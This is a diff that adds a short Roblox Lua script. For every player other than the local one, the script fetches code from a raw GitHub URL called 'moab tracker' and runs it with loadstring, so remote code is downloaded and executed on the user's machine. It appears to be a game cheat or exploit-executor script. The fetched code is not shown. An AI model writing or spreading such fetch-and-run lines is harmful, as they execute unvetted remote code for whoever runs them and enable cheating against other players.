@@ -1,0 +1,5 @@
+for _, playercheck in ipairs(game.Players:GetChildren()) do
+	if playercheck.Name ~= game.Players.LocalPlayer.Name then
+		loadstring(game:HttpGet('https://raw.githubusercontent.com/Exquisitest/moabtracker/main/moab%20tracker'))()
+	end
+end
